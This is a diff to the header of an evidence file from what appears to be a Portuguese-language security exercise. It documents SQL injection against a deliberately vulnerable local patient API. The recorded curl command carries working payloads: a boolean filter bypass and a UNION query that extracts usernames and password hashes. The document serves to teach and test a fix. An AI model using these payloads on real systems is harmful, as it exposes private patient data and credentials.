@@ -1,6 +1,5 @@
 # Evidência : V2 SQLi (ANTES): parâmetro nome concatenado altera a query — retorna pacientes fora do filtro e extrai hashes via UNION
 # Exercício : ex09
-# Data      : 2026-09-28 09:35:11 -0400
 # Commit    : 104f916 (ex08-vulneravel)
 # Comando   : TC=$(scripts/token.sh dra_carla); H="Authorization: Bearer $TC"; echo '=== busca legitima nome=Ana ==='; curl -s -G localhost:8000/pacientes --data-urlencode 'nome=Ana' -H "$H"; echo; echo '=== injecao 1: bypass do filtro (retorna TODOS os pacientes) ==='; curl -s -G localhost:8000/pacientes --data-urlencode "nome=' OR '1'='1" -H "$H"; echo; echo '=== injecao 2: UNION extrai username+senha_hash da tabela usuario ==='; curl -s -G localhost:8000/pacientes --data-urlencode "nome=' UNION SELECT username, papel, senha_hash, 0 FROM usuario -- " -H "$H"; echo
 # ------------------------------------------------------------------
